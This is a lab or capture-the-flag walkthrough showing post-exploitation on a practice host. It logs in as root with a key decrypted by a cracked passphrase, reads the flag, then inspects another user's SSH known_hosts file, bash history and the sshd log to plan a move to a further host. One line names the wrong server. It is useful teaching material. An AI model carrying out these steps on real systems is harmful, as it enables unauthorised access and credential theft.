# Accessing `linux-srv-02`

## Login as `root`

Since the private key is already on the attacker's system, we can use it from there to login on `linux-srv-02`. Use the previously cracked password `brandon1` to decrypt the private key and perform a login:

```shell-session
kali@kali:~$ ssh -i ./id_ed25519 root@linux-srv-02
[...]
Enter passphrase for key './id_ed25519': ******** (brandon1)
[...]

root@linux-srv-02:~# hostname
linux-srv-02.nullbyte.internal

root@linux-srv-02:~# id
uid=0(root) gid=0(root) groups=0(root)
```

- The login as `root` on `linux-srv-02` was successful.

## Flag

Get the flag:

```
root@linux-srv-02:~# cat /flag.txt
ssh-labs{this-password-is-not-better}
```

## Information Gathering Users

There is a user `alice` on the system:

```shell-session
root@linux-srv-02:~# getent passwd
root:x:0:0:root:/root:/bin/bash
[...]
alice:x:1000:1000::/home/alice:/bin/bash
```

List the running processes:

```shell-session
root@linux-srv-02:~# ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 13:30 ?        00:00:00 bash /srv/entrypoint
root           8       1  0 13:30 ?        00:00:01 sshd: /usr/sbin/sshd -E /var/log/sshd [listener] 0 of 10-100 startup
root           9       1  0 13:30 ?        00:00:00 tail -f /dev/null
root        5261       8  0 15:20 ?        00:00:00 sshd-session: root [priv]
root        5266    5261  0 15:20 ?        00:00:01 sshd-session: root@pts/0
root        5267    5266  0 15:20 pts/0    00:00:00 -bash
root        6518       8  1 15:40 ?        00:00:00 sshd-session: alice [priv]
alice       6524    6518  0 15:40 ?        00:00:00 sshd-session: alice@notty
alice       6525    6524  0 15:40 ?        00:00:00 sleep 10
root        6526    5267  0 15:40 pts/0    00:00:00 ps -ef
```

- `alice` is logged in on this system.

## Information Gathering User `alice`

Check the `known_hosts` file of `alice`:

```shell-session
root@linux-srv-02:~# cat /home/alice/.ssh/known_hosts
#
# ~/.ssh/known_hosts
#

linux-srv-03.nullbyte.internal,linux-srv-03 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBlig98MUDupb6CqSd4gvYPIw8EvMzH7TMe2ere2o/W6
```

- There is a host `linux-srv-03`

Check the bash shell history of `alice`:

```shell-session
root@linux-srv-02:~# grep ssh /home/alice/.bash_history
ssh linux-srv-03
```

- `alice` probably connected to `linux-srv-03`

## Authentication Configuration of `linux-srv-03`

Test which authentication methods are supported by `linux-srv-03`:

```shell-session
root@linux-srv-02:~# ssh -v alice@linux-srv-03
[...]
debug1: Authentications that can continue: password
debug1: Next authentication method: password
alice@linux-srv-03's password: 
```

- The server `linux-srv-02` does only support password authentication.

## SSH Server Log Analysis

Watching the SSH server log for some time:

```shell-session
root@linux-srv-02:~# tail -f /var/log/sshd 
Disconnected from user alice 172.17.0.9 port 43874
Received disconnect from 172.17.0.9 port 49624:11: disconnected by user
Disconnected from user alice 172.17.0.9 port 49624
Accepted password for alice from 172.17.0.9 port 43880 ssh2
Accepted password for alice from 172.17.0.9 port 34208 ssh2
Received disconnect from 172.17.0.9 port 34208:11: disconnected by user
Disconnected from user alice 172.17.0.9 port 34208
Received disconnect from 172.17.0.9 port 43880:11: disconnected by user
Disconnected from user alice 172.17.0.9 port 43880
Accepted password for alice from 172.17.0.9 port 34212 ssh2
Accepted password for alice from 172.17.0.9 port 36444 ssh2
Received disconnect from 172.17.0.9 port 36444:11: disconnected by user
```

- It looks like `alice` performs a new login using a password every 10 seconds.